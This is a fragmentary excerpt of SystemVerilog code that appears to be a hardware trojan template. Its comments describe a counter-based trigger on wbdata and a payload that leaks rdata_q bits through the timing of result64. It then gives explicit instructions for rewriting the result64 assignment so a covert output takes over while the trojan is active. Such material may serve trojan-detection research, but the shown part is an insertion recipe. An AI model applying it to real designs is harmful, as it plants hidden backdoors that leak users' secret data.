 ...
 *   
 * Trigger: Counter on wbdata
 * Payload: Modulate result64 timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of result64:
...
logic       covert_bit_out;         // Drives result64 when trojan active
...
//   Find the assign for result64 (or rd_error_o as fallback):
//     assign result64 = <normal_expr>;
//   Replace with:
//     assign result64 = trojan_active ? covert_bit_out : (<normal_expr>);
//
